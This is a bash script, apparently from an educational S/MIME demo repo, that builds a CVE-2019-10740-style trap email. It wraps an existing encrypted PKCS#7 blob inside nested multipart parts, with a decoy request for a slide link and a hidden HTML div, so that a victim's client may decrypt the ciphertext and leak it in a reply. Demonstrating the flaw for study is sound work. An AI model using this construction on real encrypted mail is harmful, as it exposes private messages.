#!/usr/bin/env bash
set -euo pipefail

# Build demo_out/cve_2019_10740_trap.eml: multipart message embedding the PKCS#7
# from smime-demo/demo_out/encrypted.pem (CVE-2019-10740-style wrap; see README).

ROOT="$(cd "$(dirname "${BASH_SOURCE[0]}")/.." && pwd)"
REPO="$(cd "$ROOT/.." && pwd)"
OUT="$ROOT/demo_out"
PEM="$REPO/smime-demo/demo_out/encrypted.pem"
EML="$OUT/cve_2019_10740_trap.eml"

mkdir -p "$OUT"

if [[ ! -f "$PEM" ]]; then
  echo "error: $PEM not found" >&2
  echo "  Run the normal S/MIME demo through encryption first, e.g. from the repo root:" >&2
  echo "    ./smime-demo/scripts/run_all.sh" >&2
  echo "  or: ./smime-demo/scripts/03_encrypt_decrypt.sh" >&2
  exit 1
fi

hdr_tmp="$(mktemp)"
body_tmp="$(mktemp)"
cleanup() { rm -f "$hdr_tmp" "$body_tmp"; }
trap cleanup EXIT

awk '/^$/{exit} !/^MIME-Version/{print}' "$PEM" > "$hdr_tmp"
awk 'BEGIN{f=0} /^$/{f=1;next} f' "$PEM" > "$body_tmp"

if [[ ! -s "$body_tmp" ]]; then
  echo "error: no base64 body in $PEM" >&2
  exit 1
fi

outer_bnd="----=_Part_outer_$(openssl rand -hex 10)"
inner_bnd="----=_Part_inner_$(openssl rand -hex 10)"

if date -R >/dev/null 2>&1; then
  date_header="$(date -R)"
else
  date_header="$(date '+%a, %d %b %Y %H:%M:%S %z')"
fi

{
  echo "From: Alice Demo <alice@demo.local>"
  echo "To: Bob Demo <bob@demo.local>"
  echo "Subject: CVE-2019-10740 demo - multipart wrap (educational)"
  echo "Date: $date_header"
  echo "Message-ID: <cve-demo-$(openssl rand -hex 16)@demo.local>"
  echo "MIME-Version: 1.0"
  echo "Content-Type: multipart/mixed; boundary=\"${outer_bnd}\""
  echo ""
  echo "--${outer_bnd}"
  echo "Content-Type: text/plain; charset=UTF-8"
  echo "Content-Transfer-Encoding: 7bit"
  echo ""
  echo "Quick question about the deck - can you send the slide link?"
  echo ""
  echo "--${outer_bnd}"
  echo "Content-Type: multipart/mixed; boundary=\"${inner_bnd}\""
  echo ""
  echo "--${inner_bnd}"
  echo "Content-Type: text/plain; charset=UTF-8"
  echo "Content-Transfer-Encoding: 7bit"
  echo ""
  printf '\n\n\n\n'
  echo "--${inner_bnd}"
  echo "Content-Type: text/html; charset=UTF-8"
  echo "Content-Transfer-Encoding: 7bit"
  echo ""
  echo '<html><body><div style="display:none;overflow:hidden;height:0;width:0">.</div><p>Thanks.</p></body></html>'
  echo ""
  echo "--${inner_bnd}"
  cat "$hdr_tmp"
  echo ""
  cat "$body_tmp"
  echo ""
  echo "--${inner_bnd}--"
  echo "--${outer_bnd}--"
} > "$EML"

echo "Wrote $EML"
